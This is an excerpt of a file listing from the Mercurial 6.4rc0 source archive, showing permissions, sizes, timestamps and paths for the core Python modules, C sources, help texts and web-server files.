+-rw-r--r--   0 alphare   (1000) alphare   (1000)      717 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cffi/bdiffbuild.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1497 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cffi/mpatch.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1017 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cffi/mpatchbuild.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3864 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cffi/osutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2469 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cffi/osutilbuild.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    80539 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/changegroup.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20122 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/changelog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26160 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/chgserver.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   139581 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/cmdutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18319 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/color.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   266807 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/commands.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24092 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/commandserver.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18666 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/commit.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1030 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/compat.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8656 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/config.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    53795 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/configitems.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   103075 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/context.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    46956 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/copies.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    72638 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/crecord.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    40425 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dagop.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15445 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dagparser.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   156082 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/debugcommands.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.218632 mercurial-6.4rc0/mercurial/defaultrc/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/defaultrc/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7436 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/defaultrc/mergetools.rc
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17445 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/destutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2300 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/diffhelper.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5099 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/diffutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    63927 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dirstate.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26436 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dirstatemap.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.218632 mercurial-6.4rc0/mercurial/dirstateutils/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dirstateutils/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2270 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dirstateutils/docket.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3926 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dirstateutils/timestamp.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15148 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dirstateutils/v2.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22406 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/discovery.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    46895 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dispatch.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2246 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/dummycert.pem
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22710 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/encoding.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18219 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/error.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    97822 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/exchange.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4310 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/exewrapper.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    31766 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/extensions.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12044 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/exthelper.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11528 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/fancyopts.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9139 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/filelog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    43641 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/filemerge.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18948 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/fileset.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10550 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/filesetlang.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26818 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/formatter.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17075 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/graphmod.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7283 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/grep.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11460 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hbisect.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    39685 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/help.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.218632 mercurial-6.4rc0/mercurial/helptext/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3349 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/bundlespec.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4608 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/color.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      240 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/common.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   127093 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/config.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1275 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/dates.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      678 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/deprecated.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1358 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/diffs.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4385 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/environment.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2149 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/evolution.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1251 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/extensions.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2119 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/filesets.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3005 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/flags.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15214 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/glossary.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1856 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/hg-ssh.8.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3200 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/hg.1.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      723 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/hgignore.5.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3418 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/hgignore.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      795 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/hgrc.5.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3366 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/hgweb.txt
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/helptext/internals/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5459 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/bid-merge.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19670 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/bundle2.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3270 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/bundles.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3928 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/cbor.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1279 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/censor.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10485 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/changegroups.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3187 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/config.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24408 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/dirstate-v2.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13612 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/extensions.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11384 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/linelog.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2588 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/mergestate.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5895 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/requirements.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11319 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/revlogs.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    42319 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/wireprotocol.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29462 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/wireprotocolrpc.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24727 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/internals/wireprotocolv2.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4513 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/merge-tools.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1467 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/pager.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3815 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/patterns.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3044 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/phases.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6980 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/revisions.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3178 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/rust.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8184 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/scripting.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7386 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/subrepos.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5975 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/templates.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2531 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/helptext/urls.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    55483 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hg.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/hgweb/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3296 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9068 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/common.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18182 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/hgweb_mod.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20376 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/hgwebdir_mod.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22682 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/request.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13114 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/server.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    47598 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/webcommands.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27561 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/webutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3003 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/wsgicgi.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7020 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hgweb/wsgiheaders.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11752 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/hook.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4310 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/httpconnection.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20937 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/httppeer.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4080 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/i18n.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/interfaces/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/interfaces/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6642 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/interfaces/dirstate.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    66249 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/interfaces/repository.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1009 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/interfaces/util.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27889 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/keepalive.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15185 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/linelog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   146776 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/localrepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12020 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/lock.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    43811 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/logcmdutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5026 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/logexchange.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3936 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/loggingutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4134 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/lsprof.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2757 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/lsprofcalltree.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17155 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/mail.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    77108 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/manifest.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    53355 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/match.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17881 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/mdiff.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    92844 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/merge.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    31883 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/mergestate.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      463 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/mergeutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    33038 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/metadata.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3581 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/minifileset.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29765 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/minirst.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8398 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/mpatch.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      713 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/mpatch.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8293 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/namespaces.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12789 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/narrowspec.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1799 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/node.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    37622 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/obsolete.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    36632 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/obsutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26220 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/parser.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   104081 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/patch.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12816 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pathutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    33272 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/phases.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4716 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/policy.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24699 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/posix.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8772 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/profiling.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10401 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/progress.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/pure/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pure/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2028 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pure/base85.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2643 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pure/bdiff.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2285 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pure/charencode.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3592 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pure/mpatch.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6042 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pure/osutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32278 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pure/parsers.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1669 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pushkey.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6075 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pvec.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13845 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pycompat.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6667 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/pythoncapi_compat.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3620 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/rcutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18156 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/registrar.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18832 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/repair.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4547 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/repocache.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17211 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/repoview.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4888 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/requirements.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   123158 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlog.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.222632 mercurial-6.4rc0/mercurial/revlogutils/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2303 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1495 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/concurrency_checker.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9965 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/constants.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21533 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/debug.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    53081 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/deltas.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14441 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/docket.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7467 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/flagutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21951 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/nodemap.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5433 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/randomaccessfile.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3642 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/revlogv0.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29504 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/rewrite.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6264 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revlogutils/sidedata.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    90863 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revset.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29091 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/revsetlang.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8708 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/rewriteutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2740 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/scmposix.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    77872 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/scmutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3565 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/scmwindows.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7167 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/server.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18630 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/setdiscovery.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    40881 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/shelve.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3998 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/similar.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17294 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/simplemerge.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    34365 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/smartset.py
